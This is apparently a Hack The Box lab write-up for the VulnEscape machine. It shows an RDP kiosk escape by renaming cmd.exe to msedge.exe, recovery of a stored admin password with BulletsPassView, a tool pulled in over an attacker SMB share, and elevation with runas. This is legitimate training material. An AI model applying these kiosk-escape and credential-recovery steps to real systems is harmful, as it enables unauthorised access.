---
title: VulnEscape
date: 2026-05-17
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Port3389-rdp-xfreerdp
  - Port3389-rdp-kiosk-mode
  - OWASP-Access-Filesystem
  - Windows-Privilege-Remote-Desktop-Plus
  - Windows-Privilege-Runas
  - Windows-Privilege-UAC-Bypass
  - windows
lastmod: 2026-05-20T03:22:31.808Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/VulnEscape" >}}

***

### nmap

`nmap` finds a single open TCP port, RDP (3389):

```
┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ sudo nmap -p- -vvv -min-rate 10000 10.129.234.51

[sudo] password for parallels:

Sorry, try again.

[sudo] password for parallels:

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-03 12:07 HKT

Initiating Ping Scan at 12:07

Scanning 10.129.234.51 [4 ports]

Completed Ping Scan at 12:07, 0.07s elapsed (1 total hosts)

Initiating Parallel DNS resolution of 1 host. at 12:07

Completed Parallel DNS resolution of 1 host. at 12:07, 0.01s elapsed

DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]

Initiating SYN Stealth Scan at 12:07

Scanning 10.129.234.51 [65535 ports]

Discovered open port 3389/tcp on 10.129.234.51

Completed SYN Stealth Scan at 12:07, 13.28s elapsed (65535 total ports)

Nmap scan report for 10.129.234.51

Host is up, received echo-reply ttl 127 (0.050s latency).

Scanned at 2026-05-03 12:07:12 HKT for 13s

Not shown: 65534 filtered tcp ports (no-response)

PORT STATE SERVICE REASON

3389/tcp open ms-wbt-server syn-ack ttl 127

  

Read data files from: /usr/bin/../share/nmap

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds

Raw packets sent: 131083 (5.768MB) | Rcvd: 12 (512B)

┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]

└─$

┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]

└─$ sudo nmap -p 3389 -sCV 10.129.234.51

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-03 12:10 HKT

Nmap scan report for 10.129.234.51

Host is up (0.049s latency).

  

PORT STATE SERVICE VERSION

3389/tcp open ms-wbt-server Microsoft Terminal Services

|_ssl-date: 2026-05-03T04:10:54+00:00; +1s from scanner time.

| ssl-cert: Subject: commonName=Escape

| Not valid before: 2026-05-02T03:57:43

|_Not valid after: 2026-11-01T03:57:43

| rdp-ntlm-info:

| Target_Name: ESCAPE

| NetBIOS_Domain_Name: ESCAPE

| NetBIOS_Computer_Name: ESCAPE

| DNS_Domain_Name: Escape

| DNS_Computer_Name: Escape

| Product_Version: 10.0.19041

|_ System_Time: 2026-05-03T04:10:49+00:00

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds

```

### RDP

{{< toggle "Tag 🏷️" >}}

{{< tag "Port3389-rdp-xfreerdp" >}} The only open port is remote desktop (RDP), which typically requires credentials. I’ll connect with xfreerdp /v:10.129.234.51 /dynamic-resolution +clipboard -sec-nla, and the resulting window shows a Windows PC in Kiosk mode:

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ xfreerdp /v:10.129.234.51 -sec-nla
```

Clicking the button over RDP opens a login screen, where I’ll use those creds:

![Pasted image 20260517121845.png](/ob/Pasted%20image%2020260517121845.png)

It works, and loads an image:

{{< toggle "Tag 🏷️" >}}

{{< tag "Port3389-rdp-kiosk-mode" >}} This is likely some kind of Kiosk mode where it is showing full screen this image or website. Kiosk mode is a device lockdown feature that restricts smartphones, tablets, or computers to a single app or a limited set of applications, transforming them into dedicated tools. It secures devices by blocking unauthorized access to settings, browser, or other apps, often used for POS systems, self-service kiosks, and digital signage.

{{< /toggle >}}

[Kiosk mode](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-configure-kiosk-mode)\
![Pasted image 20260517121904.png](/ob/Pasted%20image%2020260517121904.png)\
\--> you can view windows file by edge `c:\`

Clicking around doesn’t seem to have any impact on the system. However, when I push the Windows key, it pops the start menu:\
![Pasted image 20260517164340.png](/ob/Pasted%20image%2020260517164340.png)

If I search for “cmd”, it does load, but clicking it doesn’t do anything:

![Pasted image 20260517164356.png](/ob/Pasted%20image%2020260517164356.png)

There are some configuration pages in a language I don’t speak, but after clicking around to get through them, I’ve got a full Edge page:

PowerShell behaves the same way.

I’ll type “edge”, and it brings up Edge:

![Pasted image 20260517164411.png](/ob/Pasted%20image%2020260517164411.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-Access-Filesystem" >}} I’ll enter “C:” as the URL, and it loads a file browser:

{{< /toggle >}}

![Pasted image 20260517121916.png](/ob/Pasted%20image%2020260517121916.png)

![Pasted image 20260517121927.png](/ob/Pasted%20image%2020260517121927.png)

I’ll head into `C:\Windows\System32` and find `cmd.exe`. Clicking on it, it is downloaded to this user’s Downloads folder:

![Pasted image 20260517121943.png](/ob/Pasted%20image%2020260517121943.png)\
The restricted files could be identified many ways. One way would be by name. I’ll rename the binary from `cmd.exe` to `0xdf.exe`, but the same issue:

![Pasted image 20260503124326.png](Pasted%20image%2020260503124326.png)\
![Pasted image 20260517121954.png](/ob/Pasted%20image%2020260517121954.png)\
This suggests that the block is an allow list, rather than a block list. I know that Edge is allowed to run, so I’ll try renaming the binary to `msedge.exe`, and it opens!

![Pasted image 20260517122005.png](/ob/Pasted%20image%2020260517122005.png)

There’s not much interesting in the KioskUser0 user’s home directory:

```

PS C:\> ls -force

  
  

Directory: C:\

  
  

Mode LastWriteTime Length Name

---- ------------- ------ ----

d--hs- 2/4/2024 12:52 AM $Recycle.Bin

d--h-- 6/24/2025 8:23 AM $WinREAgent

d--hsl 2/3/2024 11:32 AM Documents and Settings

d----- 2/3/2024 3:11 AM inetpub

d----- 12/7/2019 1:14 AM PerfLogs

d-r--- 4/10/2025 11:29 PM Program Files

d-r--- 2/3/2024 3:03 AM Program Files (x86)

d--h-- 6/24/2025 8:06 AM ProgramData

d--hs- 10/1/2024 11:40 PM Recovery

d--hs- 6/16/2025 4:42 AM System Volume Information

d-r--- 2/3/2024 3:43 AM Users

d----- 6/24/2025 1:24 PM Windows

d--h-- 2/3/2024 3:05 AM _admin

-a-hs- 2/4/2024 1:35 AM 8192 DumpStack.log

-a-hs- 5/2/2026 9:36 PM 8192 DumpStack.log.tmp

-a-hs- 10/1/2024 11:48 PM 2093002752 hiberfil.sys

-a-hs- 5/2/2026 9:36 PM 1476395008 pagefile.sys

-a-hs- 5/2/2026 9:36 PM 16777216 swapfile.sys

  

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Remote-Desktop-Plus" >}} The installers and passwords  directories are both empty. profiles.xml has a information about a user named admin,This file is meant to be used with Remote Desktop Plus. The one thing that jumps out is Remote Desktop Plus in  C:\Program Files or C:\Program Files (x86),They hidden the password by UI, but There’s a utility named BulletsPassView from NirSoft that will show what characters are hidden behind bullets on a Windows system to show the hidden password

{{< /toggle >}}

![Pasted image 20260517122057.png](/ob/Pasted%20image%2020260517122057.png)

```

PS C:\_admin> type profiles.xml

<?xml version="1.0" encoding="utf-16"?>

<!-- Remote Desktop Plus -->

<Data>

<Profile>

<ProfileName>admin</ProfileName>

<UserName>127.0.0.1</UserName>

<Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>

<Secure>False</Secure>

</Profile>

</Data>

PS C:\_admin>

```

```

PS C:\Program Files (x86)> ls

  
  

Directory: C:\Program Files (x86)

  
  

Mode LastWriteTime Length Name

---- ------------- ------ ----

d----- 12/7/2019 1:31 AM Common Files

d----- 6/24/2025 1:19 PM Internet Explorer

d----- 2/3/2024 3:14 AM Microsoft

d----- 12/7/2019 1:31 AM Microsoft.NET

d----- 2/3/2024 3:03 AM Remote Desktop Plus

d----- 6/24/2025 10:10 AM Windows Defender

d----- 2/3/2024 3:07 AM Windows Mail

d----- 6/24/2025 10:10 AM Windows Media Player

d----- 6/24/2025 1:19 PM Windows Multimedia Platform

d----- 12/7/2019 1:50 AM Windows NT

d----- 6/24/2025 10:10 AM Windows Photo Viewer

d----- 6/24/2025 1:19 PM Windows Portable Devices

d----- 12/7/2019 1:31 AM WindowsPowerShell

  
  

PS C:\Program Files (x86)>

```

### BulletsPassView

There’s a utility named [BulletsPassView](https://www.nirsoft.net/utils/bullets_password_view.html) from NirSoft that will show what characters are hidden behind bullets on a Windows system.

I’ll download it from the website and unzip the result, giving `BulletsPassView.exe`. I’ll start a SMB server on my host:

```
oxdf@hacky$ smbserver.py share $(pwd) -smb2support -username oxdf -password oxdf
/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

On VulnEscape, I’ll mount the share, copy the file over, and run it:

```
PS C:\> net use \\10.10.14.79\share /u:oxdf oxdf
The command completed successfully.

PS C:\> copy \\10.10.14.79\share\BulletsPassView.exe C:\Users\kioskUser0\Downloads\

PS C:\> C:\Users\kioskUser0\Downloads\BulletsPassView.exe
```

It opens up, detects the running windows, and shows the password:

![Pasted image 20260518133401.png](/ob/Pasted%20image%2020260518133401.png)

RDP Fail

I can try to log in with RDP with the new creds, but it doesn’t work:

This is surprising as admin is in the Administrators group:

```
PS C:\> net user admin
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/3/2024 3:45:01 AM
Password expires             Never
Password changeable          2/3/2024 3:45:01 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/10/2025 11:26:42 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

VulnEscape must be configured to not allow with only Administrators group.

### Runas

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Runas" >}} Owning the password to directly switch to admin with runas.

{{< /toggle >}}

```
PS C:\> runas /user:admin powershell
Enter the password for admin:
Attempting to start powershell as user "ESCAPE\admin" ...
```

A new window opens:

![Pasted image 20260518133701.png](/ob/Pasted%20image%2020260518133701.png)

### UAC

This shell is missing the full Administrator privileges:

![Pasted image 20260518133726.png](/ob/Pasted%20image%2020260518133726.png)\
It must be UAC that’s blocking.

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-UAC-Bypass" >}} This shell is missing the full Administrator privileges,It must be UAC that’s blocking. With GUI access, a quick way to bypass UAC is to run start-process powershell.exe -verb runas. This pops the interactive UAC dialog:

{{< /toggle >}}

![Pasted image 20260518133837.png](/ob/Pasted%20image%2020260518133837.png)\
I’ll click yes and a blue PowerShell window opens:

![Pasted image 20260518133851.png](/ob/Pasted%20image%2020260518133851.png)\
This shell has full privs:

![Pasted image 20260518133903.png](/ob/Pasted%20image%2020260518133903.png)
